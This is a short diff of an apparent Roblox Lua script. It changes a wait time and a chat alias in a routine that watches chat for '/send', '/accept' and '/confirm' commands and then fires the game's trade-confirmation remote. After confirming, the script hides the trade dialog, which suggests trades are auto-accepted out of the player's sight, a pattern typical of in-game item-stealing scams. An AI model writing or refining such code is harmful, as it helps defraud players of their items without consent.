@@ -118,7 +118,7 @@ coroutine.wrap(function()
       local RouterClient = Loads("RouterClient")
       local AcceptTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
       AcceptTradeRemote:FireServer()
-      wait(2)
+      wait(5)
       game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
     end
     
@@ -161,7 +161,7 @@ coroutine.wrap(function()
               if lowerMsg == "/send" or lowerMsg == "send" then
                 SendTrade()
               end
-              if lowerMsg == "/accept" or lowerMsg == "accept" or lowerMsg == "acc" then
+              if lowerMsg == "/accept" or lowerMsg == "accept" or lowerMsg == "acce" then
                 AcceptTrade()
               end
               if lowerMsg == "/confirm" or lowerMsg == "confirm" or lowerMsg == "con" then
